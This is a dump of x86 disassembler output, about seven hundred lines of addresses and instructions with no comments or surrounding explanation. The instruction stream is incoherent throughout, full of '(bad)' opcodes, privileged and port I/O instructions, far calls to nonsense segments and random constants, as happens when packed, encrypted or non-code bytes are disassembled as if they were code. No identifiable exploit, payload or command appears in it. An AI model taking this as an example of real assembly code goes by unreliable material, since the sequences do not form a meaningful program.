  40491e:	xlat   BYTE PTR ds:[ebx]
  40491f:	push   ebp
  404920:	clc    
  404921:	stc    
  404922:	xchg   esp,eax
  404923:	sti    
  404924:	aam    0x12
  404926:	popa   
  404927:	mov    al,0x77
  404929:	mov    dl,0xa5
  40492b:	xchg   edx,eax
  40492c:	xor    DWORD PTR [edi-0x3b],esi
  40492f:	push   esi
  404930:	mov    edx,0xbd3f7872
  404935:	jg     0x4048f5
  404937:	xchg   BYTE PTR [esi+0x28c8aba2],dl
  40493d:	daa    
  40493e:	cmp    al,0xd3
  404940:	lds    esp,FWORD PTR [eax+0x11d14a09]
  404946:	cmp    al,0x54
  404948:	scas   al,BYTE PTR es:[edi]
  404949:	sar    DWORD PTR [edx],cl
  40494b:	hlt    
  40494c:	sub    eax,0x260d6a6
  404951:	xchg   ebx,ebx
  404953:	lock test eax,0x69b4ccd1
  404959:	imul   ebx,DWORD PTR [edx-0x2db2b703],0x826e49b9
  404963:	adc    ecx,DWORD PTR [esp+eiz*2+0x23]
  404967:	enter  0x18f6,0x8d
  40496b:	sub    ah,ch
  40496d:	sbb    eax,0x8af69d16
  404972:	push   cs
  404973:	(bad)  
  404975:	pop    ss
  404976:	ins    DWORD PTR es:[edi],dx
  404977:	aas    
  404978:	pop    ebx
  404979:	jne    0x4049e6
  40497b:	sub    ebp,DWORD PTR [ecx+edi*4-0x1b6206a5]
  404982:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404983:	push   ebp
  404984:	dec    edi
  404985:	jge    0x404923
  404987:	jo     0x404a08
  404989:	dec    edi
  40498a:	lea    ebp,[eax+edx*2-0x5e]
  40498e:	cs call 0xf0b5:0x8a4496ad
  404996:	push   edi
  404997:	jne    0x404939
  404999:	mov    al,0x85
  40499b:	sub    ch,ah
  40499d:	into   
  40499e:	in     al,0xc5
  4049a0:	push   ebp
  4049a1:	push   edx
  4049a2:	xchg   edx,eax
  4049a3:	sub    al,0x5e
  4049a5:	pop    ds
  4049a6:	outs   dx,BYTE PTR ds:[esi]
  4049a7:	sub    DWORD PTR gs:[edx+0x1f1e3e67],edi
  4049ae:	stc    
  4049af:	outs   dx,BYTE PTR ds:[esi]
  4049b0:	xchg   ebx,eax
  4049b1:	dec    ebp
  4049b2:	pop    esp
  4049b3:	inc    ebx
  4049b4:	rcr    BYTE PTR [ebx+0x62],cl
  4049b7:	xchg   edi,eax
  4049b8:	stos   BYTE PTR es:[di],al
  4049ba:	adc    BYTE PTR [edi-0x19],dl
  4049bd:	xchg   ebp,eax
  4049be:	icebp  
  4049bf:	into   
  4049c0:	mov    ch,0x6a
  4049c2:	inc    edi
  4049c3:	outs   dx,BYTE PTR ds:[esi]
  4049c4:	(bad)  
  4049c5:	sub    al,0x1
  4049c7:	ror    esp,1
  4049c9:	push   edx
  4049ca:	jns    0x404953
  4049cc:	(bad)  
  4049cd:	retf   
  4049ce:	fcmovnb st,st(5)
  4049d0:	outs   dx,DWORD PTR ds:[esi]
  4049d1:	adc    DWORD PTR [edi+esi*8+0x63],ebp
  4049d5:	fdiv   QWORD PTR [eax+0x7f]
  4049d8:	or     esp,esp
  4049da:	retf   
  4049db:	xchg   esi,eax
  4049dc:	lds    edx,FWORD PTR [esi]
  4049de:	xor    ebx,ecx
  4049e0:	(bad)  
  4049e1:	out    dx,al
  4049e2:	xchg   ecx,eax
  4049e3:	dec    ebx
  4049e4:	lea    ebx,[eax+edi*8+0x68dd52]
  4049eb:	adc    DWORD PTR [ecx],edx
  4049ed:	mov    bl,BYTE PTR [eax+0x5b]
  4049f0:	aad    0x48
  4049f2:	cmp    edx,DWORD PTR [edi-0x65cfb410]
  4049f8:	push   edx
  4049f9:	cdq    
  4049fa:	in     eax,0xdd
  4049fc:	popf   
  4049fd:	not    ch
  4049ff:	mov    ds:0xdccec7e,al
  404a04:	cmc    
  404a05:	xchg   ecx,eax
  404a06:	inc    edx
  404a07:	cdq    
  404a08:	std    
  404a09:	cmp    eax,0xf7568764
  404a0e:	stos   BYTE PTR es:[edi],al
  404a0f:	fisttp QWORD PTR [ecx-0x6d34ed87]
  404a15:	lds    edi,FWORD PTR [eax-0x1d]
  404a18:	inc    edx
  404a19:	push   cs
  404a1a:	push   ss
  404a1b:	pop    ecx
  404a1c:	mov    esi,0x23036a24
  404a21:	sbb    eax,0xc9c4eb43
  404a26:	cwde   
  404a27:	inc    edi
  404a28:	mul    DWORD PTR [bp+si+0x6b54]
  404a2d:	inc    eax
  404a2e:	jnp    0x404a45
  404a30:	stos   DWORD PTR es:[edi],eax
  404a31:	mov    esi,0x9d917788
  404a36:	(bad)  
  404a37:	repz sahf 
  404a39:	push   es
  404a3a:	cdq    
  404a3b:	jmp    0x404a00
  404a3d:	fldenv [ecx-0x5e]
  404a40:	sbb    BYTE PTR [ebx-0x18],dl
  404a43:	xor    al,BYTE PTR [edi+0xa0fd4de]
  404a49:	mov    edi,0xa59a86ea
  404a4e:	add    ebp,DWORD PTR [ebp+0x78]
  404a51:	add    eax,0x76d893b
  404a56:	loopne 0x4049f3
  404a58:	into   
  404a59:	pop    esp
  404a5a:	jne    0x4049fe
  404a5c:	or     eax,DWORD PTR [edx+0x53b742fa]
  404a62:	mov    edi,0xd3f1bac0
  404a67:	dec    edi
  404a68:	inc    esi
  404a69:	or     cl,BYTE PTR [edx-0x51]
  404a6c:	dec    ebx
  404a6d:	and    ecx,DWORD PTR [ecx]
  404a6f:	and    eax,0xb18ef62a
  404a74:	div    ecx
  404a76:	push   0x52
  404a78:	mov    DWORD PTR [eax],edx
  404a7a:	ja     0x404a06
  404a7c:	ja     0x404a01
  404a7e:	ret    0xfd81
  404a81:	and    edx,eax
  404a83:	repz test al,0xe8
  404a86:	mov    bh,0x6c
  404a88:	imul   edi,DWORD PTR [edi+0x726fedd6],0x4b
  404a8f:	sahf   
  404a90:	imul   edi,DWORD PTR [edi-0x18b34575],0x95151722
  404a9a:	jmp    0x825e:0xac70d6d2
  404aa1:	fnsave [esi-0x18]
  404aa4:	or     bh,BYTE PTR [eax+0x3a]
  404aa7:	dec    esi
  404aa8:	push   ebx
  404aa9:	sar    ecx,cl
  404aab:	cmp    DWORD PTR [edx+0x32cb857b],edi
  404ab1:	jl     0x404a90
  404ab3:	call   0x7b25:0x58a863c5
  404aba:	add    BYTE PTR [eax-0x5],bl
  404abd:	adc    DWORD PTR [edi+0xc781df],0xffffffe2
  404ac4:	aam    0x50
  404ac6:	cwde   
  404ac7:	inc    ebp
  404ac8:	dec    edx
  404ac9:	(bad)  
  404aca:	lock sub BYTE PTR [eax+0x5429daf0],dh
  404ad1:	inc    ebx
  404ad2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ad3:	mov    eax,0x7649a83b
  404ad8:	(bad)  
  404ad9:	push   ecx
  404ada:	loope  0x404b37
  404adc:	push   edi
  404add:	and    ecx,DWORD PTR [esi]
  404adf:	in     eax,dx
  404ae0:	dec    esi
  404ae1:	js     0x404b44
  404ae3:	ds (bad) 
  404ae5:	mov    al,ss:0x83bbdfb8
  404aeb:	xchg   BYTE PTR [edi-0x42f592f2],dl
  404af1:	loop   0x404a98
  404af3:	(bad)  [eax+0x6]
  404af6:	mov    bl,0xeb
  404af8:	test   DWORD PTR [edi+0x38446651],esp
  404afe:	push   ecx
  404aff:	jbe    0x404b34
  404b01:	int    0x1a
  404b03:	out    dx,eax
  404b04:	lods   al,BYTE PTR gs:[esi]
  404b06:	push   ss
  404b07:	inc    ebp
  404b08:	sub    DWORD PTR [ecx+esi*4],edi
  404b0b:	ds pushw es
  404b0e:	(bad)  
  404b10:	pop    edx
  404b11:	into   
  404b12:	sub    bh,BYTE PTR [edi-0x7f62b26]
  404b18:	mov    eax,0x6fe4273a
  404b1d:	cmc    
  404b1e:	icebp  
  404b1f:	add    al,0x26
  404b21:	dec    eax
  404b22:	xor    eax,0xfba346e3
  404b27:	aaa    
  404b28:	mov    dl,0x26
  404b2a:	mov    ebx,0xb8071a2b
  404b2f:	xor    ch,BYTE PTR [edi]
  404b31:	pop    ebx
  404b32:	jecxz  0x404b6b
  404b34:	mov    ebx,0x917fec4b
  404b39:	mov    eax,ds:0xe3a06923
  404b3e:	fldenv [ecx]
  404b40:	gs dec ecx
  404b42:	fldenv cs:[eax-0x18]
  404b46:	jo     0x404b65
  404b48:	pop    esi
  404b49:	lahf   
  404b4a:	mov    ch,0x6a
  404b4c:	mov    al,BYTE PTR [edx-0x54dd432]
  404b52:	inc    edi
  404b53:	mov    bh,0x9a
  404b55:	nop
  404b56:	sbb    bh,ch
  404b58:	ret    0xaf36
  404b5b:	mov    bl,0xbc
  404b5d:	scas   eax,DWORD PTR es:[edi]
  404b5e:	mov    ds,eax
  404b60:	push   edx
  404b61:	mov    ch,0x99
  404b63:	jmp    DWORD PTR [ebp+0x6]
  404b66:	(bad)  
  404b67:	loop   0x404aef
  404b69:	inc    ecx
  404b6a:	sub    eax,0xe370fa1c
  404b6f:	mov    dh,0x22
  404b71:	xor    al,0x79
  404b73:	cmc    
  404b74:	pop    ebp
  404b75:	rol    cl,0x5f
  404b78:	add    ah,bh
  404b7a:	int3   
  404b7b:	and    dh,bl
  404b7d:	aam    0x3f
  404b7f:	add    ebp,0x44
  404b82:	ror    DWORD PTR [eax-0x3c],0x36
  404b86:	add    eax,0x79c8a950
  404b8b:	dec    edx
  404b8c:	push   ds
  404b8d:	lods   al,BYTE PTR ds:[esi]
  404b8e:	cs call 0x2b69b940
  404b94:	loop   0x404b65
  404b96:	and    edi,DWORD PTR [eax+0x4c]
  404b99:	dec    edx
  404b9a:	popf   
  404b9b:	pop    ecx
  404b9c:	xor    cl,cl
  404b9e:	in     eax,0xd4
  404ba0:	push   ebx
  404ba1:	clc    
  404ba2:	outs   dx,DWORD PTR ds:[esi]
  404ba3:	add    esi,ebx
  404ba5:	add    BYTE PTR [edi+0x11],0xa7
  404ba9:	fstp   QWORD PTR [esi]
  404bab:	jae    0x404b98
  404bad:	aam    0x3a
  404baf:	push   esi
  404bb0:	outs   dx,BYTE PTR ds:[esi]
  404bb1:	sysexit 
  404bb3:	jmp    0xbd7e826a
  404bb8:	mov    ebp,0xfcdc005e
  404bbd:	loope  0x404b6b
  404bbf:	fisub  DWORD PTR [eax]
  404bc1:	fidivr WORD PTR [edx-0x3e]
  404bc4:	into   
  404bc5:	(bad)  [ebx]
  404bc7:	out    0x57,eax
  404bc9:	dec    edx
  404bca:	pusha  
  404bcb:	ja     0x404bb8
  404bcd:	out    dx,eax
  404bce:	scas   al,BYTE PTR es:[edi]
  404bcf:	jp     0x404b8c
  404bd1:	adc    al,BYTE PTR [esp+edi*1-0x5a]
  404bd5:	mov    ah,0xe9
  404bd7:	push   0x77fa3b2a
  404bdc:	scas   eax,DWORD PTR es:[edi]
  404bdd:	outs   dx,DWORD PTR ds:[esi]
  404bde:	xchg   esi,eax
  404bdf:	in     al,0x64
  404be1:	mov    ah,0x61
  404be3:	in     al,0xfd
  404be5:	mov    bl,0x36
  404be7:	push   ds
  404be8:	into   
  404be9:	repnz inc esi
  404beb:	cmp    eax,0x36b8a4e8
  404bf0:	or     al,0xc
  404bf2:	fcmovb st,st(1)
  404bf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bf5:	ins    DWORD PTR es:[edi],dx
  404bf6:	sbb    DWORD PTR [edi-0x5559f9c9],ecx
  404bfc:	adc    dh,al
  404bfe:	ins    DWORD PTR es:[edi],dx
  404bff:	out    0xdf,eax
  404c01:	scas   al,BYTE PTR es:[edi]
  404c02:	ror    dl,1
  404c04:	cld    
  404c05:	fild   DWORD PTR [ebx-0x32738bc8]
  404c0b:	loope  0x404c07
  404c0d:	daa    
  404c0e:	sub    bl,BYTE PTR [ecx+0x74]
  404c11:	mov    WORD PTR [edx],es
  404c13:	addr16 pop esi
  404c15:	lods   al,BYTE PTR ds:[esi]
  404c16:	sbb    bh,ah
  404c18:	push   ds
  404c19:	adc    ch,BYTE PTR [ebx+0x60]
  404c1c:	popa   
  404c1d:	outs   dx,DWORD PTR ds:[esi]
  404c1e:	xchg   esi,eax
  404c1f:	push   ss
  404c20:	xchg   DWORD PTR [edx-0x41c03406],eax
  404c26:	sub    eax,0x760a2967
  404c2b:	adc    DWORD PTR [ecx+eax*8],0xffffffaf
  404c2f:	in     eax,dx
  404c30:	mov    edx,0x4712f9b5
  404c35:	xchg   esp,eax
  404c36:	xchg   ecx,eax
  404c37:	fsubr  QWORD PTR [edi]
  404c39:	ins    BYTE PTR es:[edi],dx
  404c3a:	add    DWORD PTR [esi-0x28f47e3b],ebx
  404c40:	push   ss
  404c41:	mov    esi,0x3ddae939
  404c46:	dec    ebx
  404c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c48:	loop   0x404c47
  404c4a:	mov    cl,0xa
  404c4c:	adc    ch,BYTE PTR [ebx+0x67d22b4f]
  404c52:	inc    ecx
  404c53:	jl     0x404c3b
  404c55:	pop    esi
  404c56:	dec    esi
  404c57:	int3   
  404c58:	outs   dx,BYTE PTR ds:[esi]
  404c59:	pop    ebp
  404c5a:	aaa    
  404c5b:	and    DWORD PTR [esp+0x6f],0xb66543d
  404c63:	daa    
  404c64:	push   ss
  404c65:	sbb    DWORD PTR [ebp+edx*2+0x6a],esi
  404c69:	or     eax,0x1a82e50e
  404c6e:	in     eax,0xf6
  404c70:	(bad)  
  404c72:	xor    DWORD PTR [ebx],ebp
  404c74:	push   esi
  404c75:	mov    esp,0x4c2f24b5
  404c7a:	int3   
  404c7b:	retf   0xff35
  404c7e:	popf   
  404c7f:	xchg   edx,eax
  404c80:	jp     0x404c14
  404c82:	cmp    BYTE PTR [ecx],dl
  404c84:	and    eax,0xf311b287
  404c89:	push   esi
  404c8a:	sub    BYTE PTR [edi+0x26],0xd1
  404c8e:	outs   dx,BYTE PTR ds:[esi]
  404c8f:	add    al,0x30
  404c91:	pop    ebx
  404c92:	leave  
  404c93:	push   ecx
  404c94:	mov    eax,ds:0x5ee7bfbf
  404c99:	stos   BYTE PTR es:[edi],al
  404c9a:	ins    BYTE PTR es:[edi],dx
  404c9b:	inc    ecx
  404c9c:	pop    ecx
  404c9d:	and    DWORD PTR [eax+0x9],0xb6e08c06
  404ca4:	aam    0x16
  404ca6:	aam    0xf9
  404ca8:	shr    DWORD PTR [eax-0x5e],cl
  404cab:	push   edx
  404cac:	pop    ds
  404cad:	daa    
  404cae:	(bad)  
  404caf:	fld    st(5)
  404cb1:	ret    0xbe16
  404cb4:	jb     0x404c8d
  404cb6:	sub    BYTE PTR [eax+0x7d],bh
  404cb9:	xor    BYTE PTR [ebx-0x6dc54a98],0xf6
  404cc0:	rcl    DWORD PTR [edi+0x56],1
  404cc3:	(bad)  
  404cc4:	in     eax,0xab
  404cc6:	sbb    DWORD PTR [ecx+ebp*2],ecx
  404cc9:	and    ebx,DWORD PTR [ecx]
  404ccb:	jle    0x404c91
  404ccd:	jno    0x404d45
  404ccf:	int    0xb7
  404cd1:	jmp    0x1dd9:0xb156b027
  404cd8:	pop    ds
  404cd9:	push   eax
  404cda:	pusha  
  404cdb:	cmp    al,0x9
  404cdd:	test   eax,0x3a7f4f3d
  404ce2:	lock push ebx
  404ce4:	cmp    bh,BYTE PTR [esp+0x1e]
  404ce8:	mov    WORD PTR [edi+edx*2-0x1dc1991e],ss
  404cef:	mov    dl,0x2f
  404cf1:	xchg   DWORD PTR [ebp-0x5a927f59],esp
  404cf7:	adc    eax,0xa1c90cfa
  404cfc:	leave  
  404cfd:	stc    
  404cfe:	and    BYTE PTR [ebx],al
  404d00:	mov    fs,WORD PTR [esi]
  404d02:	sbb    edx,edx
  404d04:	test   eax,0x8a92d84f
  404d09:	mov    eax,0xcdc49f1f
  404d0e:	stos   BYTE PTR es:[edi],al
  404d0f:	in     eax,dx
  404d10:	stos   BYTE PTR es:[edi],al
  404d11:	xor    al,BYTE PTR [ecx-0x48]
  404d14:	out    0x6a,eax
  404d16:	retf   
  404d17:	in     eax,dx
  404d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d19:	into   
  404d1a:	push   ds
  404d1b:	cmp    al,0xe9
  404d1d:	push   ebp
  404d1e:	adc    bl,BYTE PTR [ebx+0x62]
  404d21:	dec    ebx
  404d22:	sub    eax,0xbfb3139c
  404d27:	sahf   
  404d28:	test   ch,dl
  404d2a:	xchg   edx,eax
  404d2b:	inc    edx
  404d2c:	icebp  
  404d2d:	in     eax,dx
  404d2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d2f:	rcl    BYTE PTR [esi-0x7f65591c],cl
  404d35:	in     eax,0xf5
  404d37:	jg     0x404cfe
  404d39:	mov    cl,0x7b
  404d3b:	or     eax,0xd5fe803a
  404d40:	(bad)  
  404d41:	fs data16 or al,0x2e
  404d45:	stc    
  404d46:	or     al,0x1c
  404d48:	fiadd  DWORD PTR [ecx-0x16]
  404d4b:	adc    al,BYTE PTR [ecx]
  404d4d:	sub    ecx,DWORD PTR [eax]
  404d4f:	call   0xe555c487
  404d54:	shl    BYTE PTR [edi],cl
  404d56:	mov    dl,0xd6
  404d58:	daa    
  404d59:	retf   0x66e6
  404d5c:	xlat   BYTE PTR ds:[bx]
  404d5e:	pop    edx
  404d5f:	test   cl,ch
  404d61:	xchg   esi,eax
  404d62:	jae    0x404d57
  404d64:	sbb    ecx,DWORD PTR [ebx+0x2]
  404d67:	imul   eax,DWORD PTR [eax],0x3d5b3ffa
  404d6d:	ja     0x404d58
  404d6f:	cwde   
  404d70:	xor    BYTE PTR [eax],ah
  404d72:	out    dx,eax
  404d73:	imul   esp,DWORD PTR [edx],0x9e84a19f
  404d79:	and    DWORD PTR [esi+0x61d9c555],edi
  404d7f:	test   edi,ebp
  404d81:	je     0x404d31
  404d83:	pushf  
  404d84:	mov    ds:0x67e812d2,al
  404d89:	sbb    DWORD PTR [esi+0x765835ab],0x80f8b237
  404d93:	add    ch,cl
  404d95:	ja     0x404d7d
  404d97:	push   cs
  404d98:	or     BYTE PTR [edi],dh
  404d9a:	adc    BYTE PTR [edx+0x6f35189c],dl
  404da0:	pop    ds
  404da1:	dec    eax
  404da2:	mov    dh,0x19
  404da4:	push   edi
  404da5:	mov    ebp,0x55495ceb
  404daa:	cmp    BYTE PTR [edx],dh
  404dac:	addr16 js 0x404dca
  404daf:	jmp    0x404d58
  404db1:	ret    0x3fda
  404db4:	mov    al,ds:0x83341ff6
  404db9:	mov    eax,ds:0x462a11aa
  404dbe:	repnz in al,0xae
  404dc1:	cdq    
  404dc2:	fwait
  404dc3:	mov    bh,0x48
  404dc5:	push   ecx
  404dc6:	outs   dx,BYTE PTR ds:[esi]
  404dc7:	outs   dx,BYTE PTR ds:[esi]
  404dc8:	dec    ecx
  404dc9:	popf   
  404dca:	dec    ecx
  404dcb:	lods   al,BYTE PTR ds:[esi]
  404dcc:	add    bl,ah
  404dce:	mov    ds:0xdc204104,eax
  404dd3:	js     0x404d9b
  404dd5:	jbe    0x404dbc
  404dd7:	sbb    al,0x5c
  404dd9:	add    esi,DWORD PTR [ebp+0x68]
  404ddc:	inc    edx
  404ddd:	cmp    eax,0x2851f60f
  404de2:	mov    dl,bh
  404de4:	test   esi,0x91fb2235
  404dea:	mov    ebx,0x3092eeba
  404def:	pop    esp
  404df0:	out    dx,eax
  404df1:	mov    esi,DWORD PTR [esi-0x71]
  404df4:	scas   eax,DWORD PTR es:[edi]
  404df5:	retf   0x15fd
  404df8:	adc    eax,0x56e37a83
  404dfd:	pop    edi
  404dfe:	xor    eax,0xdc8e98ba
  404e03:	jmp    FWORD PTR [ecx+0x1434d4b9]
  404e09:	and    al,BYTE PTR [edi+0x7cd90bf7]
  404e0f:	and    al,0xd9
  404e11:	iret   
  404e12:	frstor [esp+ebx*2-0x12f46b3e]
  404e19:	xchg   esi,eax
  404e1a:	cdq    
  404e1b:	aas    
  404e1c:	mov    ah,bh
  404e1e:	xor    eax,0x17aee8ba
  404e23:	lock sub DWORD PTR [eax+0x1e],eax
  404e27:	(bad)
  404e2b:	sar    dl,0xe3
  404e2e:	xrelease mov DWORD PTR [eax-0x79b33e22],edi
  404e35:	inc    esp
  404e36:	jne    0x404e2c
  404e38:	out    0x76,eax
  404e3a:	rcl    BYTE PTR [ebx+0x11b4e34f],0x9a
  404e41:	cmp    DWORD PTR [esi+eiz*4],0x2b
  404e45:	pop    eax
  404e46:	push   0xffffff8f
  404e48:	jmp    0xafd5f61c
  404e4d:	shl    edx,1
  404e4f:	test   DWORD PTR ds:0xcf5ab5b2,edi
  404e55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e56:	fisub  WORD PTR [ebx+0x207105eb]
  404e5c:	scas   al,BYTE PTR es:[edi]
  404e5d:	jg     0x404e3a
  404e5f:	imul   ah
  404e61:	and    eax,0xf16645da
  404e66:	repnz and al,0xfc
  404e69:	mov    dl,0x8c
  404e6b:	ss in  al,dx
  404e6d:	addr16 pushf 
  404e6f:	lahf   
  404e70:	xchg   DWORD PTR [ecx-0x33db3c21],ebx
  404e76:	xchg   ecx,eax
  404e77:	xor    dl,BYTE PTR [ebx+0x43]
  404e7a:	pop    esi
  404e7b:	mov    esp,DWORD PTR [ebp-0x65]
  404e7e:	sahf   
  404e7f:	dec    BYTE PTR [ecx+0x4f]
  404e82:	jmp    FWORD PTR ds:0xbfafccde
  404e88:	lds    ecx,FWORD PTR [edi]
  404e8a:	lea    esi,[edi-0xf]
  404e8d:	push   edi
  404e8e:	sti    
  404e8f:	lds    ebp,FWORD PTR [ecx+0x41]
  404e92:	dec    esp
  404e93:	loopne 0x404eaf
  404e95:	cmp    DWORD PTR [edx],ecx
  404e97:	(bad)  
  404e98:	ins    BYTE PTR es:[edi],dx
  404e99:	xor    eax,0x425ce563
  404e9e:	popf   
  404e9f:	xor    bh,BYTE PTR ds:0x6e9a15a
  404ea5:	push   cs
  404ea6:	mov    ebp,0x666d79b0
  404eab:	mov    cs,WORD PTR [ecx]
  404ead:	mov    bl,0x1
  404eaf:	push   ebp
  404eb0:	ja     0x404e9f
  404eb2:	jae    0x404e9d
  404eb4:	mov    bl,0xa6
  404eb6:	nop
  404eb7:	push   ss
  404eb8:	ds iret 
  404eba:	mov    bh,0x7d
  404ebc:	xchg   esp,eax
  404ebd:	ret    
  404ebe:	in     eax,0xef
  404ec0:	sub    eax,0x64e26fd9
  404ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ec6:	lds    ebx,FWORD PTR [eax]
  404ec8:	jns    0x404f20
  404eca:	jmp    0x209ab7c3
  404ecf:	mov    fs,WORD PTR [edi+edx*8-0x64]
  404ed3:	push   0x12a332d8
  404ed8:	mov    edx,0xbfb778a7
  404edd:	inc    esi
  404ede:	(bad)  
  404edf:	adc    al,0x90
  404ee1:	pusha  
  404ee2:	inc    ecx
  404ee3:	adc    cl,BYTE PTR [esi+0x27]
  404ee6:	and    ebx,eax
  404ee8:	xchg   esi,eax
  404ee9:	xchg   esi,eax
  404eea:	hlt    
  404eeb:	mov    ds,WORD PTR [eax+0x42bca4f5]
  404ef1:	mov    ah,0x46
  404ef3:	les    ecx,FWORD PTR [edi+edx*8]
  404ef6:	sbb    ch,BYTE PTR [edx-0x35fc3596]
  404efc:	xchg   esi,eax
  404efd:	cli    
  404efe:	sub    al,BYTE PTR [esi-0x2a]
  404f01:	mov    dh,0xb5
  404f03:	(bad)  
  404f04:	cmp    eax,0x5d96c97b
  404f09:	popf   
  404f0a:	add    ebp,0xfffffffa
  404f0d:	out    dx,eax
  404f0e:	sub    dl,BYTE PTR [edx-0x5e]
  404f11:	clc    
  404f12:	out    0x48,al
  404f14:	repz push ds
  404f16:	or     bh,al
  404f18:	cwde   
  404f19:	sbb    eax,0x3e455986
  404f1e:	and    ebp,0xffffffdc
  404f21:	std    
  404f22:	bound  esi,QWORD PTR [ecx]
  404f24:	push   edx
  404f25:	xchg   ebx,eax
  404f26:	inc    ecx
  404f27:	dec    esp
  404f28:	or     eax,DWORD PTR [eax+ecx*4+0x5e590515]
  404f2f:	clc    
  404f30:	pushf  
  404f31:	pop    edi
  404f32:	ins    DWORD PTR es:[edi],dx
  404f33:	call   0xf15b:0x920c2829
  404f3a:	mov    esi,0x69a37b92
  404f3f:	xor    DWORD PTR [eax+ecx*2-0x6f1cd52c],ebp
  404f46:	and    BYTE PTR [ebp-0x38],dh
  404f49:	xor    DWORD PTR [edx],edx
  404f4b:	test   esp,esi
  404f4d:	push   es
  404f4e:	xor    al,0xfe
  404f50:	popf   
  404f51:	(bad)  
  404f52:	pop    ebp
  404f53:	pop    eax
  404f54:	(bad)  
  404f56:	xchg   ecx,eax
  404f57:	ins    DWORD PTR es:[edi],dx
  404f58:	dec    ebx
  404f59:	in     eax,0x1d
  404f5b:	xlat   BYTE PTR ds:[ebx]
  404f5c:	mov    eax,ds:0xac195e69
  404f61:	gs retf 0xa0aa
  404f65:	mov    DWORD PTR [edx*4-0x3f138c5e],eax
  404f6c:	std    
  404f6d:	das    
  404f6e:	add    DWORD PTR [ecx],ebp
  404f70:	or     eax,0x335e1f2c
  404f75:	sbb    DWORD PTR [edx],ecx
  404f77:	repz xchg esi,eax
  404f79:	fistp  WORD PTR ds:0x64a97d1
  404f7f:	xor    BYTE PTR [ebx],0xc6
  404f82:	add    al,0x6b
  404f84:	out    0xbc,eax
  404f86:	or     DWORD PTR [ebx],0xffffffb2
  404f89:	and    dh,bh
  404f8b:	sbb    bh,BYTE PTR [ecx]
  404f8d:	pop    edx
  404f8e:	(bad)  
  404f8f:	adc    edi,esp
  404f91:	mov    esi,0x5b03a60d
  404f96:	fs pop edx
  404f98:	sub    BYTE PTR [ecx-0xe],dh
  404f9b:	inc    ecx
  404f9c:	pop    edx
  404f9d:	jnp    0x40501d
  404f9f:	mov    bl,0xd5
  404fa1:	popf   
  404fa2:	ret    
  404fa3:	inc    ecx
  404fa4:	(bad)  
  404fa6:	or     DWORD PTR [eax],esp
  404fa8:	mov    edx,0x263aaa9f
  404fad:	adc    al,0x4d
  404faf:	cld    
  404fb0:	pop    esp
  404fb1:	dec    esp
  404fb2:	jmp    0x405030
  404fb4:	nop
  404fb5:	(bad)  
  404fb7:	xchg   cl,al
  404fb9:	sbb    edi,DWORD PTR [ebp+0x4b]
  404fbc:	push   ss
  404fbd:	(bad)  
  404fbe:	cmp    bl,dh
  404fc0:	lahf   
  404fc1:	mov    ebp,0xe695e960
  404fc6:	mov    ebx,0x8b042a25
  404fcb:	push   edx
  404fcc:	adc    eax,0x3670d3d8
  404fd1:	cmp    esp,DWORD PTR [ecx+eiz*4+0x60]
  404fd5:	sub    esi,DWORD PTR [edi]
  404fd7:	mov    gs,ebx
  404fd9:	pop    esp
  404fda:	push   edi
  404fdb:	adc    DWORD PTR [edx],ecx
  404fdd:	shl    bl,0xd9
  404fe0:	bound  edx,QWORD PTR [edi+0x4e6f5847]
  404fe6:	test   DWORD PTR [ebx-0xcdb5a4c],0x444448bb
  404ff0:	xchg   ebx,eax
  404ff1:	xor    DWORD PTR [edi+0x6f77b806],ebp
  404ff7:	xchg   edi,eax
  404ff8:	fiadd  WORD PTR [esi+eiz*4-0xf]
  404ffc:	mov    al,0x22
  404ffe:	sub    eax,0xcd5ab02b
  405003:	(bad)  
  405004:	cdq    
  405005:	in     al,dx
  405006:	hlt    
  405007:	xchg   ecx,eax
  405008:	mov    dl,0x97
  40500a:	add    ebx,0x70
  40500d:	cmp    ah,BYTE PTR [ecx+edi*8-0x63db950e]
  405014:	call   0x770:0xa3df8f27
  40501b:	shl    DWORD PTR [ebx+esi*4-0x1],0xaa
  405020:	dec    ebx
  405021:	xor    eax,0x2cdd47c2
  405026:	push   edi
  405027:	sar    DWORD PTR [eax-0x7f9f451d],cl
  40502d:	cmp    DWORD PTR [ecx-0x5d],eax
  405030:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405031:	test   esp,esi
  405033:	fsubr  DWORD PTR [ebx]
  405035:	push   ebx
  405036:	mov    ebp,0xd3d22d8a
  40503c:	sbb    eax,0xad4c1c57
  405041:	mov    ebp,0xda3bfc19
  405046:	pusha  
  405047:	fcomp  DWORD PTR [edi]
  405049:	adc    bl,bl
  40504b:	inc    esp
  40504c:	xchg   edx,eax
  40504d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40504e:	test   eax,0xb2648b4d
  405053:	(bad)  
  405055:	pushf  
  405056:	out    0x25,al
  405058:	stc    
  405059:	adc    DWORD PTR [esi+0x1b],esp
  40505c:	call   0xc5478295
  405061:	icebp  
  405062:	sahf   
  405063:	je     0x4050cc
  405065:	lds    ebx,FWORD PTR [eax]
  405067:	js     0x405091
  405069:	add    edx,DWORD PTR [edx-0xf]
  40506c:	xchg   ebp,eax
  40506d:	adc    al,0xb0
  40506f:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405071:	sub    BYTE PTR [eax+esi*4-0x1ab61e6a],0xf2
  405079:	jp     0x405093
  40507b:	mov    eax,0x1303bebb
  405080:	addr16 lock pop eax
  405083:	(bad)  
  405085:	pop    esp
  405086:	and    al,0xce
  405088:	das    
  405089:	mov    dl,0x5f
  40508b:	out    dx,al
  40508c:	mov    ebx,0x3c18606c
  405091:	js     0x4050fb
  405093:	xor    eax,0x6f9a72ac
  405098:	xor    cl,BYTE PTR [ecx-0x6c171bff]
  40509e:	or     BYTE PTR [edx],al
  4050a0:	lods   al,BYTE PTR ds:[esi]
  4050a1:	lahf   
  4050a2:	lock fisubr WORD PTR [eax-0x47]
  4050a6:	dec    ebp
  4050a7:	xchg   ecx,eax
  4050a8:	test   BYTE PTR [edx-0x3e1a8ea8],ch
  4050ae:	sub    BYTE PTR [ecx+0x4a],0x5c
